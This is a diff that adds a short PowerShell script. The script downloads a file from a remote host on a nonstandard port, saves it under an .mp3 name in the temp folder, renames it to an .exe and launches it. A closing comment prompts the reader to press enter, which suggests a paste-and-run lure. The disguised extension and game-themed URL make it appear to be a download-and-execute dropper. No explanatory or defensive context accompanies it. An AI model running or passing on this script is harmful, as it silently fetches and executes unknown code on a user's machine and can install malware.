@@ -1,0 +1,12 @@
+$mp3Path = "$env:TEMP\script.mp3"
+$exePath = "$env:TEMP\script.exe"
+
+Invoke-WebRequest -Uri "http://mc.fissionhost.org:15028/minecraft-exe" -OutFile $mp3Path
+
+if (Test-Path $exePath) {
+    Remove-Item $exePath -Force
+}
+
+Rename-Item -Path $mp3Path -NewName (Split-Path -Leaf $exePath)
+Start-Process $exePath
+# Press enter to complete
